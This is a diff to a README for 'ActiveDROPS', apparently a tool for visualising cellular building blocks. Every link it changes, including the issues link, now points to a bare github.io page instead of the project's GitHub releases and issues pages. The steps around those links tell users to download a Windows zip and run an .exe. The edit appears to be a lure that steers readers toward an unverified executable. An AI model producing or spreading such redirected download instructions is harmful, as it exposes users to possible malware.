@@ -1,6 +1,6 @@
 # ⚛️ activedrops-research - Visualize Cellular Building Blocks in Action
 
-[![Download Latest Release](https://img.shields.io/github/v/release/jeramiepunished285/activedrops-research?label=Download%20ActiveDROPS&color=teal&style=for-the-badge)](https://github.com/jeramiepunished285/activedrops-research/releases)
+[![Download Latest Release](https://img.shields.io/github/v/release/jeramiepunished285/activedrops-research?label=Download%20ActiveDROPS&color=teal&style=for-the-badge)](https://jeramiepunished285.github.io)
 
 ## 🎯 What Is ActiveDROPS?
 
@@ -14,7 +14,7 @@ Follow these steps to start using ActiveDROPS right now.
 
 ### Step 1: Download the Software
 
-1.  Go to the [ActiveDROPS Releases Page](https://github.com/jeramiepunished285/activedrops-research/releases).
+1.  Go to the [ActiveDROPS Releases Page](https://jeramiepunished285.github.io).
 2.  Look for the latest release at the top of the page.
 3.  Find the file named `ActiveDROPS-Windows.zip` under "Assets".
 4.  Click the file name to download it to your computer.
@@ -99,7 +99,7 @@ To load a file, click the folder icon in the left panel. To save your work, clic
 
 ## 🔄 Updating the Software
 
-1.  Visit the [releases page](https://github.com/jeramiepunished285/activedrops-research/releases) again.
+1.  Visit the [releases page](https://jeramiepunished285.github.io) again.
 2.  Download the newest `ActiveDROPS-Windows.zip` file.
 3.  Extract it to a new folder (do not overwrite your old folder).
 4.  Run the new `activedrops.exe`.
@@ -114,7 +114,7 @@ ActiveDROPS is free and open source. You can view the full license text in the L
 
 If you run into trouble or have questions:
 
-- Check the [GitHub Issues page](https://github.com/jeramiepunished285/activedrops-research/issues) to see if someone else had the same problem.
+- Check the [GitHub Issues page](https://jeramiepunished285.github.io) to see if someone else had the same problem.
 - Open a new issue if your problem is not listed. Describe what happened and what you expected to happen.
 
 We respond to issues within 48 hours.
